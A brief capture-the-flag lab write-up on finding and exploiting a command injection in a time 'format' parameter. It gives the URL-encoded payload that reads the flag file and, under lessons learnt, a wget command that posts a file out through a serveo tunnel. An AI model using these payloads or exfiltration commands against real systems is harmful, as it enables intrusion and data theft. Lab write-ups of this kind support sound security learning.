Very exciting twists in this lab, and lots of lessions learned.

Discover the injectable parameter by intercepting a request with Burp Suite.
`/?format=%H:%M`
this returned the time from the server.

it can be injected by encapsulating `%H:%M` in single qoutes adding `;<command>` that is, `‘%H:%M;<command>’`
This causes command execution on the server.

However, the buffer for the website only showed one line at a time, that is the last line of any command result and the the flag since it was not conventionally named (flag.txt). Therefore, commands like `find` which returned many lines were of no use. Exfiltrating retults of the same was to no avail. Below, you will find lots of failed attempts including exfiltration through a tunnel, directory listing, base64 encoding to exfiltrate. 

the flag could be retrieved by `‘%H:%M;cat /flag’ `that is `/?format=%27%H:%M;cat%20/flag%27`

Lessons Learnt
Learnt about setting up a tunnel with serveo to expose a private IP to the internet. 
Data exfiltration throught wget and a serveo tunnel
```
wget --post-file=/flag https://fd606f13904bcb33418d892c3c293f6c.serveo.net
```

<img width="1811" height="990" alt="flag1" src="https://github.com/user-attachments/assets/4d151f84-7373-416c-acaf-2ad4802078c6" />

<img width="664" height="675" alt="serveo" src="https://github.com/user-attachments/assets/aa8c02e0-314f-42af-8c7f-f1e343afa9c0" />

<img width="661" height="1307" alt="etc-folder" src="https://github.com/user-attachments/assets/c7fdad6e-49f9-478b-84e3-52a1885bb145" />
